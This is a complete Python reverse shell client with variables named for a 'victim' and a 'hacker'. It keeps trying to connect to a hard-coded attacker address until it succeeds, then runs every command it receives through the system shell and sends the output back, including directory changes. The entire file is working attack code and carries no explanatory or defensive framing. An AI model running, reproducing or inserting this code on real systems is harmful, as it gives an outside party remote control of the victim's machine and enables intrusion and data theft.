import socket
import subprocess
import time
import os

victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hacker_ip = "192.168.100.17"
hacker_port = 10000

while True:
    try:
        victim_socket.connect((hacker_ip, hacker_port))
        break
    except:
        time.sleep(5)

while True:
    command = victim_socket.recv(1024).decode('utf-8')

    if command == "":
        continue

    if command == "stop":
        print(f"{command} is executed successfully!")
        break

    if command.startswith("cd"):
        pathToMove = command[3:].strip()
        
        if not pathToMove:
            current_dir = os.getcwd()
            victim_socket.send(f"Current directory: {current_dir}".encode())
            continue
       
        try:
            os.chdir(pathToMove)
            print(f"{command} is executed successfully!")
            victim_socket.send(f"Changed directory to {os.getcwd()}".encode())
        except FileNotFoundError:
            victim_socket.send(f"Directory not found: {pathToMove}".encode())
        continue

    try:
        command_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        
        if(command_output.strip().decode() == ""):
            command_output = f"{command} executed successfully (no output)!".encode()

    except subprocess.CalledProcessError as e:
        command_output = f"Command failed:\n{e.output.decode()}".encode()
    except Exception as e:
        command_output = f"Error: {str(e)}".encode()

    print(f"{command} is executed successfully!")
    victim_socket.send(command_output)

victim_socket.close()